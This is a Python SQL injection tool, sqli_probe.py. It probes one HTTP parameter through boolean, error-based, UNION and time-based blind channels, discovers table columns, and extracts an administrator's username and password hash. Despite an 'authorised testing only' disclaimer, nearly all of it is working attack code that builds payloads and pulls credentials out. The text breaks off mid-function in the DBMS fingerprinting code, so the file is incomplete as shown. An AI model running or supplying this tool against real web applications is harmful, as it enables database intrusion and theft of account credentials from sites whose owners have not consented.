#!/usr/bin/env python3
"""
sqli_probe.py - SQL injection probe for a single HTTP parameter.

Authorised security testing only. Point this at hosts you own or are
contracted to assess.

Channel selection, in order of preference:

  0. baseline + noise calibration        (never skipped - gates everything else)
  1. boolean differential                (true/false/control triplet)
  2. error-based                         (forced DB error carrying data)
  3. UNION SELECT                        (column count + reflected-column map)
  4. time-based blind                    (last resort; slowest, most requests)

UNION is preferred for extraction because it returns a whole row per request.
Boolean and time oracles share one character-extraction engine, so the
time-based path is a genuine fallback rather than a separate code path: if
UNION is unavailable but the boolean channel dies mid-run, the same reader is
re-pointed at the time oracle and keeps going.

Nothing is reported as a finding without a measured difference. Every
confirmed channel prints a three-gate diff: baseline request, attack request,
and the observed delta.
"""

from __future__ import annotations

import argparse
import json
import re
import statistics
import sys
import time
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from typing import Callable, Optional
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

try:
    import requests
except ImportError:
    sys.exit("sqli_probe: requires 'requests' -> pip install requests")


# --------------------------------------------------------------------------
# response fingerprinting
# --------------------------------------------------------------------------

_TOKEN_RE = re.compile(r"[a-z0-9]+")
# Fingerprint everything after the first tag-stripped chunk so that CSRF
# tokens, nonces and timestamps in the body do not swamp the diff.
_STRIP_RE = re.compile(r"<(script|style)\b.*?</\1>", re.I | re.S)


def _tokens(text: str) -> set:
    return set(_TOKEN_RE.findall(text.lower()))


def similarity(a: str, b: str) -> float:
    """0.0-1.0. Two independent measures, take the max.

    Jaccard over word tokens tolerates reordered markup and whitespace
    churn. SequenceMatcher tolerates small character-level edits that
    Jaccard treats as total disagreement. Taking the max means a real
    behavioural change still registers even if the page is noisy.
    """
    if a == b:
        return 1.0
    ta, tb = _tokens(a), _tokens(b)
    if not ta and not tb:
        return 1.0
    if not ta or not tb:
        return 0.0
    jaccard = len(ta & tb) / len(ta | tb)
    ratio = SequenceMatcher(None, a, b).ratio()
    return max(jaccard, ratio)


def stable(text: str) -> str:
    """Body with scripts/styles stripped - used for fingerprinting only."""
    return _STRIP_RE.sub(" ", text or "")


@dataclass
class Resp:
    status: int
    text: str
    elapsed: float
    location: str = ""

    @property
    def length(self) -> int:
        return len(self.text)

    def fingerprint(self) -> str:
        body = stable(self.text)
        return f"{self.status}/{len(body)}/{self.location}"


# --------------------------------------------------------------------------
# SQL dialects
# --------------------------------------------------------------------------

# Trailing comment terminator. '-- -' is accepted by MySQL, PostgreSQL and
# T-SQL alike, and the trailing dash defeats the "no space after --" quirk.
COMMENT = "-- -"

DBMS_CHOICES = ["auto", "mysql", "postgresql", "mssql"]

_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


class Dialect:
    """Per-engine SQL construction. Only the genuinely divergent bits."""

    def __init__(self, name: str):
        self.name = name

    # -- time delays ------------------------------------------------------
    def sleep_bare(self, n: float) -> str:
        """Delay with no condition attached - used to prove the channel."""
        if self.name == "postgresql":
            return f"(SELECT pg_sleep({n}))"
        if self.name == "mssql":
            return f"; WAITFOR DELAY '0:0:{n:04d}'"
        return f"(SELECT SLEEP({n}))"

    def sleep_cond(self, cond: str, n: float) -> str:
        """Delay only when `cond` holds - the time-based boolean oracle."""
        if self.name == "postgresql":
            return (
                f"(SELECT CASE WHEN {cond} THEN pg_sleep({n}) "
                f"ELSE pg_sleep(0) END)"
            )
        if self.name == "mssql":
            return f"; IF ({cond}) WAITFOR DELAY '0:0:{n:04d}'"
        return f"(SELECT IF({cond},SLEEP({n}),0))"

    # -- data handling ----------------------------------------------------
    def concat(self, *parts: str) -> str:
        return f"CONCAT({', '.join(parts)})"

    def substr(self, expr: str, pos: int) -> str:
        return f"SUBSTRING({expr},{pos},1)"

    def ascii(self, expr: str) -> str:
        return f"ASCII({expr})"

    def length(self, expr: str) -> str:
        return f"LEN({expr})" if self.name == "mssql" else f"LENGTH({expr})"

    def db(self) -> str:
        if self.name == "postgresql":
            return "current_database()"
        if self.name == "mssql":
            return "DB_NAME()"
        return "DATABASE()"

    # -- error-based extraction ------------------------------------------
    def error_probe(self, expr: str) -> str:
        """Fragment that raises an error whose text embeds `expr`."""
        if self.name == "postgresql":
            return f"CAST(({expr}) AS integer)"
        if self.name == "mssql":
            return f"CONVERT(int, {expr})"
        return f"extractvalue(1,CONCAT(0x7e,({expr}),0x7e))"

    def error_parse(self, text: str) -> Optional[str]:
        """Recover the echoed value from a DB error page."""
        # MySQL extractvalue/updatexml wrap the value in tildes.
        m = re.search(r"~([^~]{1,512})~", text)
        if m:
            return m.group(1)
        m = re.search(r"conversion of[^']*'([^']{1,512})'", text, re.I)
        if m:
            return m.group(1)
        m = re.search(r'invalid input syntax for (?:type )?\w+:\s*"([^"]{1,512})"',
                      text, re.I)
        if m:
            return m.group(1)
        return None

    # -- metadata ---------------------------------------------------------
    def columns_expr(self, table: str, ordinal: int) -> str:
        """A single-row SELECT yielding column `ordinal` of `table`."""
        t = table.replace("'", "''")
        if self.name == "postgresql":
            return (
                "SELECT column_name FROM information_schema.columns "
                f"WHERE table_name='{t}' AND table_schema='public' "
                f"AND ordinal_position={ordinal} LIMIT 1"
            )
        if self.name == "mssql":
            return (
                "SELECT c.name FROM sys.columns c "
                "JOIN sys.tables t ON t.object_id=c.object_id "
                f"WHERE t.name='{t}' AND c.column_id={ordinal}"
            )
        return (
            "SELECT column_name FROM information_schema.columns "
            f"WHERE table_name='{t}' AND table_schema={self.db()} "
            f"AND ordinal_position={ordinal} LIMIT 1"
        )

    def stacked_queries_ok(self) -> bool:
        return self.name == "mssql"


# --------------------------------------------------------------------------
# HTTP target
# --------------------------------------------------------------------------

@dataclass
class Finding:
    channel: str
    title: str
    evidence: str = ""
    payload: str = ""
    detail: dict = field(default_factory=dict)


class Target:
    def __init__(self, args: argparse.Namespace):
        self.a = args
        self.d = Dialect(args.dbms)
        self.session = requests.Session()
        self.session.verify = not args.insecure
        self.session.headers.update(
            {"User-Agent": args.user_agent, "Accept": "*/*"}
        )
        for k, v in (h.split(":", 1) for h in args.header or []):
            self.session.headers[k.strip()] = v.strip()
        if args.cookie:
            self.session.headers["Cookie"] = args.cookie

        self.base_pairs = self._parse_body(args.data) if args.data else []
        self.base_value = ""
        for k, v in self.base_pairs:
            if k == args.param:
                self.base_value = v
                break
        if args.method.upper() == "GET" and not self.base_pairs:
            self.base_pairs = parse_qsl(urlsplit(args.url).query,
                                        keep_blank_values=True)
            for k, v in self.base_pairs:
                if k == args.param:
                    self.base_value = v
                    break

        if args.value is not None:
            self.base_value = args.value

        self.requests_made = 0
        self.findings: list[Finding] = []
        self.baseline: Optional[Resp] = None
        self.timings_baseline: list[float] = []

    @staticmethod
    def _parse_body(raw: str) -> list:
        if raw.strip().startswith("{"):
            return list(json.loads(raw).items())
        return parse_qsl(raw, keep_blank_values=True)

    def build(self, value: str) -> tuple:
        pairs, replaced = [], False
        for k, v in self.base_pairs:
            if k == self.a.param:
                pairs.append((k, value))
                replaced = True
            else:
                pairs.append((k, v))
        if not replaced:
            pairs.append((self.a.param, value))
        if self.a.method.upper() == "GET":
            parts = urlsplit(self.a.url)
            qs = urlencode(pairs)
            return urlunsplit((parts.scheme, parts.netloc, parts.path, qs,
                               parts.fragment)), None
        return self.a.url, urlencode(pairs)

    def send(self, value: str) -> Optional[Resp]:
        url, body = self.build(value)
        t0 = time.perf_counter()
        try:
            r = self.session.request(
                self.a.method.upper(), url, data=body,
                timeout=self.a.timeout, allow_redirects=self.a.follow,
            )
        except requests.RequestException as exc:
            print(f"    [transport] {type(exc).__name__}: {exc}", file=sys.stderr)
            return None
        self.requests_made += 1
        time.sleep(self.a.pause)
        return Resp(r.status_code, r.text, time.perf_counter() - t0,
                    r.headers.get("Location", ""))

    def send_raw(self, extra: str, value: str) -> Optional[Resp]:
        """Send a payload that may start with its own comment (stacking)."""
        return self.send(extra + value)

    # -- payload construction --------------------------------------------
    def wrap(self, core: str) -> str:
        """Place `core` into the parameter's value position."""
        if self.a.type == "int":
            return f"{self.base_value} {core}"
        return f"{self.base_value}'{core}"


# --------------------------------------------------------------------------
# reporting helpers
# --------------------------------------------------------------------------

def hr(title: str = "") -> None:
    if title:
        print(f"\n{'=' * 68}\n{title}\n{'=' * 68}")
    else:
        print("=" * 68)


def ok(msg: str) -> None:
    print(f"  [+] {msg}")


def bad(msg: str) -> None:
    print(f"  [-] {msg}")


def info(msg: str) -> None:
    print(f"  [i] {msg}")


def diff_gate(baseline: Resp, attack: Resp, label: str) -> float:
    s = similarity(stable(baseline.text), stable(attack.text))
    ok(f"{label}")
    print(f"        baseline : {baseline.fingerprint()}  "
          f"len={baseline.length}")
    print(f"        attack   : {attack.fingerprint()}  "
          f"len={attack.length}")
    print(f"        similarity: {s:.3f}  delta_len: "
          f"{attack.length - baseline.length:+d}")
    return s


# --------------------------------------------------------------------------
# channel 0 - baseline + noise calibration
# --------------------------------------------------------------------------

def calibrate(t: Target) -> bool:
    hr("PHASE 0  baseline and noise calibration")
    samples = []
    for i in range(t.a.calibration):
        r = t.send(t.base_value)
        if r is None:
            bad("baseline request failed - target unreachable?")
            return False
        samples.append(r)
        time.sleep(0.05)

    t.baseline = samples[-1]
    t.timings_baseline = [s.elapsed for s in samples]

    mean_len = statistics.mean(s.length for s in samples)
    spread = max(s.length for s in samples) - min(s.length for s in samples)
    pair_sims = [similarity(stable(x.text), stable(y.text))
                 for x in samples for y in samples]
    worst = min(pair_sims) if pair_sims else 1.0

    print(f"  baseline value  : {t.base_value!r}")
    print(f"  status          : {t.baseline.status}")
    print(f"  body length     : mean={mean_len:.0f}  spread={spread}")
    print(f"  latency         : median={statistics.median(t.timings_baseline):.3f}s"
          f"  max={max(t.timings_baseline):.3f}s")
    print(f"  min self-sim    : {worst:.3f}  (natural page variance)")

    if t.a.true_regex and re.search(t.a.true_regex, t.baseline.text, re.I):
        info("baseline already matches --true-regex; assuming this is the "
             "authenticated view")
        t.a.true_is_baseline = True
    else:
        t.a.true_is_baseline = False

    if spread > t.a.noise_len or worst < t.a.noise_sim:
        bad("baseline is not stable enough to diff against "
            f"(need spread<={t.a.noise_len}, self-sim>={t.a.noise_sim})")
        info("loosen --noise-len / --noise-sim, or use --value with a "
             "value that renders a stable page")
        return False
    ok("baseline is stable - differential testing is meaningful")
    return True


# --------------------------------------------------------------------------
# channel 1 - boolean differential
# --------------------------------------------------------------------------

class BoolOracle:
    """True/false oracle over response appearance."""

    def __init__(self, t: Target):
        self.t = t
        self.d = t.d
        self.requests = 0
        self.channel = "boolean"

    def _build(self, cond: str) -> str:
        return self.t.wrap(f" AND ({cond}) {COMMENT}")

    def ask(self, cond: str) -> bool:
        r = self.t.send(self._build(cond))
        self.requests += 1
        if r is None:
            return False
        return self._classify(r)

    def _classify(self, r: Resp) -> bool:
        a = self.t.a
        if a.true_regex and re.search(a.true_regex, r.text, re.I):
            return True
        if a.false_regex and re.search(a.false_regex, r.text, re.I):
            return False
        s = similarity(stable(self.t.baseline.text), stable(r.text))
        return s >= a.sim_gate


def detect_boolean(t: Target) -> Optional[BoolOracle]:
    hr("PHASE 1  boolean differential")
    d = t.d
    if t.a.dry_run:
        info(f"dry-run: {t.wrap(f' AND (1842=1842) {COMMENT}')}")
        return None

    # Three requests: one provably true, two provably false. The second
    # false probe is a control - if the two false responses differ, the
    # page is noisy or a WAF is interfering and any "difference" between
    # true and false would be a false positive.
    true_payload = t.wrap(f" AND (1842=1842) {COMMENT}")
    false_a = t.wrap(f" AND (1842=1843) {COMMENT}")
    false_b = t.wrap(f" AND (7777=8888) {COMMENT}")

    rt, rfa, rfb = t.send(true_payload), t.send(false_a), t.send(false_b)
    if not (rt and rfa and rfb):
        bad("could not complete the true/false/control triplet")
        return None

    st = stable(rt.text)
    s_ta = similarity(st, stable(rfa.text))
    s_fb = similarity(stable(rfa.text), stable(rfb.text))
    s_tb = similarity(st, stable(rfb.text))

    print(f"  payload true   : {true_payload!r}")
    print(f"  payload false  : {false_a!r}")
    print(f"  control        : {false_b!r}")
    print()
    diff_gate(t.baseline, rt, "gate 1: baseline vs TRUE condition")
    diff_gate(rfa, rfb, "gate 2: FALSE vs FALSE control")
    print()
    print(f"  true-vs-falseA : {s_ta:.3f}")
    print(f"  true-vs-falseB : {s_tb:.3f}")
    print(f"  falseA-vs-falseB (control) : {s_fb:.3f}")

    # Evaluated, not just "different": server-side comparison works.
    if s_ta >= t.a.sim_gate and s_tb >= t.a.sim_gate:
        bad("true and false conditions render identically - no boolean "
            "channel")
        return None
    if s_fb < t.a.sim_gate:
        bad("the two false conditions disagree - response is unstable or "
            "an intermediary is rewriting payloads; result is unreliable")
        return None
    if s_ta >= t.a.sim_gate:
        bad("true and false are too similar to separate "
            f"({s_ta:.3f} >= --sim-gate {t.a.sim_gate})")
        return None

    ok("boolean differential confirmed - server-side conditions are "
       "evaluated and reflected")
    t.findings.append(Finding(
        "boolean",
        "Boolean-based SQL injection",
        f"true-vs-false similarity {s_ta:.3f} / {s_tb:.3f}, "
        f"false-control stability {s_fb:.3f}",
        true_payload,
        {"sim_true_false": round(s_ta, 4),
         "sim_false_control": round(s_fb, 4)},
    ))
    return BoolOracle(t)


# --------------------------------------------------------------------------
# channel 2 - error-based
# --------------------------------------------------------------------------

class ErrorOracle:
    def __init__(self, t: Target):
        self.t = t
        self.d = t.d
        self.requests = 0
        self.channel = "error"

    def _build(self, expr: str) -> str:
        return self.t.wrap(f" AND {self.d.error_probe(expr)} {COMMENT}")

    def read(self, expr: str) -> Optional[str]:
        r = self.t.send(self._build(expr))
        self.requests += 1
        if r is None:
            return None
        return self.d.error_parse(r.text)


def detect_error(t: Target) -> Optional[ErrorOracle]:
    hr("PHASE 2  error-based extraction")
    d = t.d
    probe = t.wrap(f" AND {d.error_probe('1/0')} {COMMENT}")
    if t.a.dry_run:
        info(f"dry-run: {probe}")
        return None

    r = t.send(probe)
    if r is None:
        bad("error probe transport failure")
        return None
    print(f"  payload: {probe!r}")
    db_hit = d.error_parse(r.text) is not None
    s = similarity(stable(t.baseline.text), stable(r.text))
    print(f"        status={r.status} len={r.length} "
          f"similarity_to_baseline={s:.3f} db_value_echoed={db_hit}")
    snippet = re.sub(r"\s+", " ", t.baseline.text)[:0]  # no body echo by default

    if not (db_hit or s < t.a.sim_gate):
        bad("no DB error text and no response change - no error channel")
        return None
    ok("error channel available - SQL errors are reflected to the client"
       + ("" if db_hit else "  (response changes, value echo unconfirmed)"))
    if not db_hit:
        info("value echo not confirmed; will be validated on first read")
    t.findings.append(Finding(
        "error", "Error-based SQL injection",
        f"db_error_echoed={db_hit} similarity_to_baseline={s:.3f}", probe,
    ))
    return ErrorOracle(t)


# --------------------------------------------------------------------------
# channel 3 - UNION SELECT
# --------------------------------------------------------------------------

def count_columns(t: Target) -> Optional[int]:
    hr("PHASE 3a  UNION - column count")
    if t.a.ncols:
        ok(f"column count supplied: {t.a.ncols}")
        return t.a.ncols
    if t.a.dry_run:
        info("dry-run: would probe ORDER BY 1..%d" % t.a.max_cols)
        return None

    for n in range(1, t.a.max_cols + 1):
        r = t.send(t.wrap(f" ORDER BY {n} {COMMENT}"))
        if r is None:
            return None
        err = re.search(r"unknown column|out of range|SQLSTATE|Unspecified"
                        r" error|ORDER BY position", r.text, re.I)
        changed = (r.status != t.baseline.status or err
                   or similarity(stable(t.baseline.text), stable(r.text))
                   < t.a.sim_gate)
        if changed:
            ok(f"ORDER BY {n} fails -> result set has {n - 1} column(s)")
            return n - 1
        print(f"    ORDER BY {n}: ok")
    bad(f"no column count found up to {t.a.max_cols}")
    return None


def map_reflected(t: Target, ncols: int) -> Optional[int]:
    hr("PHASE 3b  UNION - reflected column map")
    marker = "zq" + "".join(
        __import__("random").choice("0123456789abcdef") for _ in range(6)
    )
    cols = [f"'{marker}{i}'" for i in range(ncols)]
    payload = t.wrap(
        f" UNION SELECT {','.join(cols)} {COMMENT}"
    )
    if t.a.dry_run:
        info(f"dry-run: {payload}")
        return None

    r = t.send(payload)
    if r is None:
        return None
    print(f"  payload: {payload!r}")
    hits = [i for i in range(ncols) if f"{marker}{i}" in r.text]
    if not hits:
        bad("UNION accepted but no probe column is reflected - the query "
            "result is not rendered (UNION unusable for extraction)")
        return None
    ok(f"reflected column(s): {hits} (marker {marker})")
    t.findings.append(Finding(
        "union", "UNION-based SQL injection",
        f"columns={ncols} reflected={hits}", payload,
        {"ncols": ncols, "reflected": hits},
    ))
    return hits[0]


class UnionOracle:
    def __init__(self, t: Target, ncols: int, slot: int):
        self.t = t
        self.d = t.d
        self.ncols = ncols
        self.slot = slot
        self.requests = 0
        self.channel = "union"

    def read(self, expr: str) -> Optional[str]:
        cols = ["NULL"] * self.ncols
        cols[self.slot] = expr
        payload = self.t.wrap(
            f" UNION SELECT {','.join(cols)} {COMMENT}"
        )
        r = self.t.send(payload)
        self.requests += 1
        if r is None:
            return None
        return r.text


def read_union(oracle: UnionOracle, expr: str, max_chars: int) -> Optional[str]:
    """Extract `expr` by leaving it in the reflected column and slicing the
    surrounding HTML out of the response."""
    r = oracle.read(expr)
    if r is None or not r:
        return None
    # The value appears somewhere in the page. Pull the longest run of
    # printable non-<> characters - that is the rendered cell.
    candidates = re.findall(r"[^<>\r\n]{2,}", r)
    best, best_score = "", -1.0
    for c in candidates:
        printable = sum(1 for ch in c if 32 <= ord(ch) < 127) / max(len(c), 1)
        if printable > 0.85 and len(c) > best_score:
            best, best_score = c, len(c)
    best = best.strip()
    return best[:max_chars] if best else None


# --------------------------------------------------------------------------
# channel 4 - time-based blind
# --------------------------------------------------------------------------

class TimeOracle:
    """Boolean oracle carried by response latency.

    Estimator is the MINIMUM over N samples. A condition that fires the
    delay must exceed it on every sample; a condition that does not fire
    returns fast on every sample, so the min is immune to a single slow
    outlier. Using the mean here is the classic source of false positives.
    """

    def __init__(self, t: Target):
        self.t = t
        self.d = t.d
        self.requests = 0
        self.channel = "time"
        self.samples = t.a.samples
        self.floor = max(t.timings_baseline) + 0.25

    def _timing(self, payload: str) -> float:
        out = []
        for _ in range(self.samples):
            r = self.t.send(payload)
            if r is None:
                return 0.0
            out.append(r.elapsed)
        return min(out)

    def ask(self, cond: str) -> bool:
        payload = self.t.wrap(
            f" AND {self.d.sleep_cond(cond, self.t.a.sleep)} {COMMENT}"
        )
        return self._timing(payload) >= self.floor + self.t.a.sleep * 0.75


def detect_time(t: Target) -> Optional[TimeOracle]:
    hr("PHASE 4  time-based blind channel")
    d = t.d
    oracle = TimeOracle(t)
    print(f"  latency floor  : {oracle.floor:.3f}s "
          f"(baseline max {max(t.timings_baseline):.3f}s + 0.25)")
    print(f"  injected delay : {t.a.sleep}s, {t.a.samples} samples, "
          f"estimator=min")
    if t.a.timeout <= t.a.sleep + 2:
        bad(f"--timeout {t.a.timeout} must exceed --sleep {t.a.sleep} + 2s")
        return None

    if t.a.dry_run:
        info(f"dry-run: {t.wrap(f' AND {d.sleep_bare(t.a.sleep)} {COMMENT}')}")
        return None

    # Gate A: does an unconditional delay actually stall the response?
    stall = t.send(t.wrap(f" AND {d.sleep_bare(t.a.sleep)} {COMMENT}"))
    if stall is None:
        bad("transport failure on delay probe")
        return None
    print(f"  A. delay probe        : {stall.elapsed:.3f}s "
          f"(status {stall.status})")

    # Gate B: does a provably-false condition avoid the delay? Without this
    # a slow server or a WAF holding the connection would look vulnerable.
    control = oracle._timing(
        t.wrap(f" AND {d.sleep_cond('1=0', t.a.sleep)} {COMMENT}")
    )
    print(f"  B. false condition    : {control:.3f}s")

    # Gate C: true condition stalls.
    truth = oracle._timing(
        t.wrap(f" AND {d.sleep_cond('1=1', t.a.sleep)} {COMMENT}")
    )
    print(f"  C. true condition     : {truth:.3f}s")

    if stall.elapsed < oracle.floor + t.a.sleep * 0.75:
        bad("unconditional delay did not stall the response - "
            "time channel unusable")
        return None
    if control >= oracle.floor + t.a.sleep * 0.75:
        bad("false condition also stalls - latency is not controllable by "
            "the injection point; refusing to report this as a finding")
        return None
    if truth < oracle.floor + t.a.sleep * 0.75:
        bad("true condition did not stall - inconsistent")
        return None

    ok(f"time-based channel confirmed "
       f"(true {truth:.2f}s vs false {control:.2f}s, floor {oracle.floor:.2f}s)")
    if d.stacked_queries_ok():
        info("MSSQL delay requires stacked queries - if this failed, the "
             "driver/endpoint likely blocks them; use a boolean or UNION "
             "channel instead")
    t.findings.append(Finding(
        "time", "Time-based blind SQL injection",
        f"true={truth:.2f}s false={control:.2f}s floor={oracle.floor:.2f}s",
        t.wrap(f" AND {d.sleep_bare(t.a.sleep)} {COMMENT}"),
        {"true_s": round(truth, 2), "false_s": round(control, 2)},
    ))
    return oracle


# --------------------------------------------------------------------------
# shared character reader (boolean / time / error oracles)
# --------------------------------------------------------------------------

PRINTABLE_LO, PRINTABLE_HI = 32, 126


def blind_read(oracle, expr: str, max_chars: int, label: str,
               known_length: Optional[int] = None) -> Optional[str]:
    """Binary-search the characters of `expr`.

    One engine, three oracles. `oracle.ask(cond)` is the only requirement,
    so the time-based path is a drop-in replacement when in-band channels
    are unavailable.
    """
    d: Dialect = oracle.t.d
    pace = "slow" if oracle.channel == "time" else "fast"
    print(f"  reading {label!r} via {oracle.channel} channel ({pace})")
    print(f"    expr: {expr}")

    if known_length is None:
        lo, hi = 0, 512
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle.ask(f"{d.length(expr)} > {mid}"):
                lo = mid
            else:
                hi = mid - 1
        length = lo
        print(f"    length = {length}  ({oracle.requests} requests)")
        if length == 0:
            bad("expression evaluated to NULL/empty")
            return None
        if length > max_chars:
            info(f"length {length} exceeds --max-chars {max_chars}, truncating")
            length = max_chars
    else:
        length = known_length
        print(f"    length = {length} (supplied)")

    if oracle.channel == "time":
        est = length * 7 * oracle.samples * t_sleep(oracle) / 60
        info(f"estimated ~{est:.0f} min at current settings "
             f"({oracle.requests} requests so far)")

    chars = []
    for pos in range(1, length + 1):
        lo, hi = PRINTABLE_LO, PRINTABLE_HI
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle.ask(f"{d.ascii(d.substr(expr, pos))} > {mid}"):
                lo = mid
            else:
                hi = mid - 1
        if lo == PRINTABLE_LO and not oracle.ask(
                f"{d.ascii(d.substr(expr, pos))} >= {PRINTABLE_LO}"):
            break  # NULL - end of value
        ch = chr(lo)
        chars.append(ch)
        if pos % 16 == 0 or pos == length:
            print(f"    [{pos:>4}/{length}] {''.join(chars)[-72:]!r}")
    return "".join(chars)


def t_sleep(oracle) -> float:
    return oracle.t.a.sleep


# --------------------------------------------------------------------------
# schema discovery + credential extraction
# --------------------------------------------------------------------------

USER_HINTS = ("user", "login", "email", "uname", "account", "name")
PASS_HINTS = ("password", "passwd", "pwd", "hash", "digest", "secret")


def discover_columns(oracle, t: Target) -> list:
    hr("SCHEMA  column discovery")
    expr_tpl = t.d.columns_expr(t.a.table, "{p}")
    names = []
    for ordinal in range(1, t.a.max_ordinal + 1):
        if oracle.channel == "union":
            got = read_union(oracle, expr_tpl.format(p=ordinal), 64)
        elif oracle.channel == "error":
            got = oracle.read(expr_tpl.format(p=ordinal))
        else:
            got = blind_read(oracle, expr_tpl.format(p=ordinal), 48,
                             f"column {ordinal}", known_length=32)
            if got:
                got = got.strip(" \t\r\n\x00") or None
        if not got:
            info(f"column {ordinal}: none")
            break
        got = got.strip()
        names.append(got)
        print(f"  column {ordinal}: {got!r}")
        if not got.isidentifier():
            info("non-identifier column name - will be quoted on extraction")
    if not names:
        bad("no columns recovered; falling back to the supplied names")
    return names


def pick(names: list, t: Target, kind: str) -> Optional[str]:
    hints = USER_HINTS if kind == "user" else PASS_HINTS
    for n in names:
        ln = n.lower()
        if any(h in ln for h in hints):
            return n
    return None


def quote_ident(name: str, d: Dialect) -> str:
    if name.isidentifier():
        return name
    if d.name == "mssql":
        return "[" + name.replace("]", "]]") + "]"
    return '"' + name.replace('"', '""') + '"'


def extract(oracle, t: Target, cols: list) -> dict:
    hr("EXTRACT  admin credentials")
    d = t.d
    user_col = pick(cols, t, "user") or t.a.user_col
    pass_col = pick(cols, t, "pass") or t.a.pass_col
    print(f"  username column: {user_col}")
    print(f"  password column: {pass_col}")
    print(f"  table          : {t.a.table}")
    print(f"  row filter     : {t.a.where or f'{user_col}={t.a.admin!r}'}")

    uc, pc = quote_ident(user_col, d), quote_ident(pass_col, d)
    tbl = t.a.table
    where = t.a.where or f"{uc}='{t.a.admin}'"
    payload_expr = d.concat(uc, "0x7c", pc)

    print(f"  select expr    : {payload_expr}")
    print(f"  from           : {tbl} where {where}")

    if t.a.dry_run:
        info("dry-run: stopping before extraction")
        return {}

    value = None
    if oracle.channel == "union":
        wrapped = (f"(SELECT {payload_expr} FROM {tbl} WHERE {where} LIMIT 1)")
        if d.name == "mssql":
            wrapped = f"(SELECT TOP 1 {payload_expr} FROM {tbl} WHERE {where})"
        value = read_union(oracle, wrapped, 512)
    elif oracle.channel == "error":
        value = oracle.read(f"(SELECT {payload_expr} FROM {tbl} "
                            f"WHERE {where} LIMIT 1)")

    if not value:
        info("in-band read did not yield a clean value; "
             "falling back to character-by-character blind read")
        value = blind_read(oracle, f"(SELECT {payload_expr} FROM {tbl} "
                                   f"WHERE {where} LIMIT 1)",
                           t.a.max_chars, "admin credential blob")

    if not value:
        bad("extraction failed on every available channel")
        return {}

    if "|" in value:
        username, _, phash = value.partition("|")
    else:
        username, phash = value.strip(), ""
        info("no '|' separator in the result - check --user-col/--pass-col")

    username, phash = username.strip(), phash.strip()
    algo = detect_hash_alg(phash)

    print()
    print(f"  {'-' * 60}")
    print(f"  USERNAME     : {username}")
    print(f"  PASSWORD HASH: {phash}")
    print(f"  HASH ALGO    : {algo}")
    print(f"  {'-' * 60}")
    return {"username": username, "password_hash": phash, "algo": algo,
            "via": oracle.channel, "requests": oracle.requests}


def detect_hash_alg(h: str) -> str:
    if not h:
        return "unknown (empty)"
    if re.fullmatch(r"\$2[aby]?\$", h[:4]) or h.startswith("$2"):
        return "bcrypt ($2y$/$2b$)"
    if h.startswith("$argon2"):
        return "argon2"
    if h.startswith("$1$"):
        return "md5crypt"
    if h.startswith("$5$"):
        return "sha256crypt"
    if h.startswith("$6$"):
        return "sha512crypt"
    if h.startswith("$P$"):
        return "phpass (wordpress)"
    if h.startswith("pbkdf2_"):
        return "django pbkdf2"
    if h.startswith("{SSHA}") or h.startswith("{SHA}") or h.startswith("$apr1$"):
        return "ldap / apr1"
    if re.fullmatch(r"[a-fA-F0-9]{32}", h):
        return "md5 (unsalted)"
    if re.fullmatch(r"[a-fA-F0-9]{40}", h):
        return "sha1 (unsalted)"
    if re.fullmatch(r"[a-fA-F0-9]{64}", h):
        return "sha256 (unsalted)"
    if re.fullmatch(r"[a-fA-F0-9]{128}", h):
        return "sha512 (unsalted)"
    if h.isdigit() and len(h) <= 12:
        return "possible plaintext numeric - verify"
    return "unrecognised format"


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="SQL injection probe for a single HTTP parameter.",
        epilog="Authorised security testing only.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    g = p.add_argument_group("target")
    g.add_argument("--url", required=True, help="endpoint to test")
    g.add_argument("--param", required=True, help="parameter to inject into")
    g.add_argument("--method", default="POST", choices=["GET", "POST"])
    g.add_argument("--data", help="raw body, urlencoded or JSON")
    g.add_argument("--value", help="override the parameter's base value")
    g.add_argument("--cookie")
    g.add_argument("--header", action="append", metavar="K: V")
    g.add_argument("--user-agent", default=_USER_AGENT)
    g.add_argument("--insecure", action="store_true", help="skip TLS verify")
    g.add_argument("--follow", action="store_true", help="follow redirects")

    g = p.add_argument_group("injection")
    g.add_argument("--type", default="string", choices=["string", "int"])
    g.add_argument("--dbms", default="auto", choices=DBMS_CHOICES)
    g.add_argument("--timeout", type=float, default=15.0)
    g.add_argument("--pause", type=float, default=0.15,
                   help="politeness delay between requests")
    g.add_argument("--dry-run", action="store_true",
                   help="print payloads, send nothing")

    g = p.add_argument_group("detection")
    g.add_argument("--calibration", type=int, default=5)
    g.add_argument("--sim-gate", type=float, default=0.95,
                   help="similarity at/below which responses count as equal")
    g.add_argument("--noise-len", type=int, default=200,
                   help="max baseline body-length spread")
    g.add_argument("--noise-sim", type=float, default=0.90,
                   help="min baseline self-similarity")
    g.add_argument("--true-regex",
                   help=r"regex identifying the TRUE response, e.g. 'logout'")
    g.add_argument("--false-regex",
                   help=r"regex identifying the FALSE response, e.g. 'invalid'")
    g.add_argument("--ncols", type=int, help="skip ORDER BY probing")
    g.add_argument("--max-cols", type=int, default=40)
    g.add_argument("--max-chars", type=int, default=256)
    g.add_argument("--max-ordinal", type=int, default=32)

    g = p.add_argument_group("time-based blind")
    g.add_argument("--sleep", type=float, default=5.0,
                   help="injected delay in seconds")
    g.add_argument("--samples", type=int, default=2,
                   help="requests per boolean; estimator is the min")

    g = p.add_argument_group("extraction")
    g.add_argument("--table", default="users")
    g.add_argument("--user-col", default="username")
    g.add_argument("--pass-col", default="password")
    g.add_argument("--admin", default="admin")
    g.add_argument("--where", help="override the row filter")
    g.add_argument("--no-discover", action="store_true",
                   help="skip column discovery, use the supplied names")
    g.add_argument("--out", help="write the report as JSON")

    return p


def autodetect_dbms(t: Target) -> None:
    """Fingerprint from reflected DB error text or the Version() comment."""
    hr("PHASE 0b  backend fingerprint")
    if t.a.dry_run:
        info("dry-run: skipping fingerprint")
        return
    probes = {
        "mysql": " AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2 FROM "
                 "information_schema.tables WHERE 1=1 AND extractvalue"
                 "(1,1))x) ",
